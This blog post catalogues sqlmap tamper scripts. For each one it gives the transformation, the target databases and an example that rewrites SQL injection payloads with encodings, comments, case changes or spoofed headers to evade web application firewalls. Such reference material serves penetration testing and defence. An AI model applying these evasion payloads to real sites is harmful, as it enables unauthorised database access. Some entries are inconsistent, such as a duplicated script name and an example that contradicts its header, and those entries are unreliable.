---
title: SQLMAP Tamper
date: 2016-09-05 15:10:42
tags: "sqlmap"
---

### apostrophemask.py
**Function: 用utf8编码引号**

**Platform:All**
> example

```
1 AND '1'='1 ==> 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871
```

### apostrophenullencode.py
**Function: ' ==> %00%27**

**Platform: All**

> example

```
1 AND '1'='1 ==> 1 AND %00%271%00%27=%00%271
```

### appendnullbyte.py
**Function: 空格 ==> %00**

**Platform: Microsoft Access**
> example

```
1 AND 1=1 ==> 1 AND 1=1%00
```

### base64encode.py
**Function: base64 encode**

**Platform: All**

> example

```
1' AND SLEEP(5)# ==> MScgQU5EIFNMRUVQKDUpIw==
```

### between.py
**Function: > ==> NOT BETWEEN 0 AND**

**Platform: Mssql2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0**
> example

```
1 AND A > B-- ==> 1 AND A NOT BETWEEN 0 AND B--```、```1 AND A = B-- ==> 1 AND A BETWEEN B AND B--
```

### bluecoat.py
**Function: 空格 ==> %09**

**Platform: MySQL 5.1, SGOS**

> example

```
SELECT id FROM users WHERE id = 1 ==> SELECT%09id FROM%09users WHERE%09id LIKE 1
```

### chardoubleencode.py
**Function: 双url编码**

**Platform: All**
> example

```
SELECT FIELD FROM%20TABLE ==> %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545
```

### charencode.py 
**Function: url编码**

**Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0**
> example

```
SELECT FIELD FROM%20TABLE ==> %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45
```

### charunicodeencode.py
**Function: escape编码**

**Platform: Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET**
> example

```
SELECT FIELD%20FROM TABLE ==> %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045
```

### commalesslimit.py
**Function: limit 2,3 ==> LIMIT 3 OFFSET 2**

**Platform: MySQL 5.0 and 5.5**
> example

```
LIMIT 2, 3 ==> LIMIT 3 OFFSET 2
```

### commalessmid.py
**Function: MID(VERSION(), 1, 1) ==> MID(VERSION() FROM 1 FOR 1)**

**Platform: MySQL 5.0 and 5.5**
> example

```
MID(VERSION(), 1, 1) ==> MID(VERSION() FROM 1 FOR 1)
```

### concat2concatws.py
**Function: CONCAT() ==> CONCAT_WS()**

**Platform: MySQL 5.0**
> example

```
CONCAT(1,2) ==> CONCAT_WS(MID(CHAR(0),0,0),1,2)
```

### equaltolike.py
**Function: ＝ ==> like**

**Platform: Mssql 2005、MySQL 4, 5.0 and 5.5**
> example

```
SELECT * FROM users WHERE id=1 ==> SELECT * FROM users WHERE id LIKE 1
```

### escapequotes.py
**Function: ' ==> \\'、" ==> \\"**

**Platform: All**
> example

```
1" AND SLEEP(5)# ==> 1\\\\" AND SLEEP(5)#
```
### greatest.py
**Function: > ==> GREATEST**

**Platform: MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0**
> example

```
1 AND A > B ==> 1 AND GREATEST(A,B+1)=A
```

### halfversionedmorekeywords.py
**Function: 空格 ==> /*!0**

**Platform: MySQL 4.0.18, 5.0.22**
> example

```
union ==> /*!0union
```

### ifnull2ifisnull.py
**Function: IFNULL(A, B) ==> IF(ISNULL(A), B, A)**

**Platform: MySQL 5.0 and 5.5**
> example

```
IFNULL(1, 2) ==> IF(ISNULL(1),2,1)
```

### informationschemacomment.py
**Function: 空格 ==> /\*\*/**

**Platform: MySQL**
> example

```
SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES
```

### lowercase.py
**Function: INSERT ==> insert**

**Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0**
> example

```
SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> select table_name from information_schema.tables
```

### modsecurityversioned.py
**Function: AND ==> /*!12345AND*/**

**Platform: MySQL 5.0**
> example

```
1 AND 2>1-- ==> 1 /*!30874AND 2>1*/--
```

### multiplespaces.py
**Function: 空格 ==> 多个空格**

**Platform: All**
> example

```
1 UNION SELECT foobar ==> 1    UNION     SELECT   foobar
```

### nonrecursivereplacement.py
**Function: union ==> uniunionon**

**Platform: All**
> example

```
1 UNION SELECT 2-- ==> 1 UNIOUNIONN SELESELECTCT 2--
```

### overlongutf8.py
**Function: unicode编码**

**Platform: All**
> example

```
SELECT FIELD FROM TABLE WHERE 2>1 ==> SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1
```

### percentage.py
**Function: select ==> s%e%l%e%c%t**

**Platform: Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0**
> example

```
SELECT FIELD FROM TABLE ==> %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E
```

### randomcase.py
**Function: INSERT ==> INseRt**

**Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0**
> example

```
INSERT ==> InseRt
```

### randomcomments.py
**Function: INSERT ==> I/\*\*/N/\*\*/SERT**

**Platform: Mysql**

> example

```
INSERT ==> I/**/N/**/SERT
```

### securesphere.py

**Function: 1 AND 1=1 ==> 1 AND 1=1 and '0having'='0having'**

**Platform: All**
> example

```
1 AND 1=1 ==> 1 AND 1=1 and '0having'='0having'
```

### sp_password.py
**Function: 空格 ==>  sp_password**

**Platform: Mssql**
> example

```
1 AND 9227=9227--  ==> 1 AND 9227=9227-- sp_password
```
### space2comment.py
**Function: 空格 ==> /\*\*/**

**Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0**
> example

```
SELECT id FROM users ==> SELECT/**/id/**/FROM/**/users
```
### space2dash.py
**Function: 空格 ==> --nVNaVoPYeva%0A**

**Platform:MSSQL、SQLite**
> example

```
1 AND 9227=9227 ==> 1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227
```

### space2hash.py
**Function: 空格 ==> %23nVNaVoPYeva%0A**

**Platform: MySQL 4.0, 5.0**
> example

```
1 AND 9227=9227 ==> 1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227
```

### space2morehash.py
**Function: 空格 ==> %23ngNvzqu%0A**

**Platform: MySQL 5.1.41**

> example

```
1 AND 9227=9227 ==> 1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227
```

### space2mssqlblank.py

**Function: 空格 ==> %0E**

**Platform: Mssql 2000,2005**
> example

```
SELECT id FROM users ==> SELECT%0Eid%0DFROM%07users
```

### space2mssqlblank.py
**Function: 空格 ==> %23%0A**

**Platform: Mssql、Mysql**
> example

```
1 AND 1=1 ==> 1%23%0AAND%23%0A9227=9227
```

### space2mysqlblank.py
**Function: 空格 ==> %2B、%0D、%0C**

**Platform: Mysql5.1**
> example

```
SELECT id FROM users ==> SELECT%0Bid%0DFROM%0Cusers
```

### space2mysqldash.py
**Function: 空格 ==> --%0A**

**Platform: Mssql、Mysql**
> example

```
1 AND 9227=9227 ==> 1--%0AAND--%0A9227=9227
```

### space2plus.py
**Function: 空格 ==> +**

**Platform: All**

> example

```
SELECT id FROM users ==> SELECT+id+FROM+users
```

### space2randomblank.py
**Function: 空格 ==> %0D、%0A、%0C、%09**

**Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 **

> example

```
SELECT id FROM users ==> SELECT%0Did%0DFROM%0Ausers
```

### symboliclogical.py
**Function: and ==> %26%26**

**Platform: All**
> example

```
1 AND '1'='1 ==> 1 %26%26 '1'='1
```

### thinkphp.py
**Platform: Mysql**

### unionalltounion.py

**Function: 替换All为空**

**Platform: All**
> example

```
-1 UNION ALL SELECT ==> -1 UNION SELECT
```

### unmagicquotes.py
**Function: ' ==> %df%27**

**Platform: Mysql magic_quotes/addslashes**

>example

```
1' AND 1=1 ==> 1%bf%27-- 
```

### uppercase.py
**Function: 小写转大写**

**Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0**
> example

```
insert ==> INSERT
```

### varnish.py
**Function: header头**
> example

```
X-originating-IP: 127.0.0.1
```

### versionedkeywords.py

**Function: union ==> /*!union*/**

**Platform: MySQL 4.0.18, 5.1.56, 5.5.11**
> example

```
1 union select user() ==> 1/*!UNION*//*!SELECT*/user()
```

### versionedmorekeywords.py
**Function: union ==> /*!union*/**

**Platform: MySQL 5.1.56, 5.5.11**
> example

```
1 union select user() ==> 1/*!UNION*//*!SELECT*/user()
```

### xforwardedfor.py

**Function: X-Forwarded-For随机头**

**Platform: All**
> example

```
X-Forwarded-For: 127.0.0.1
```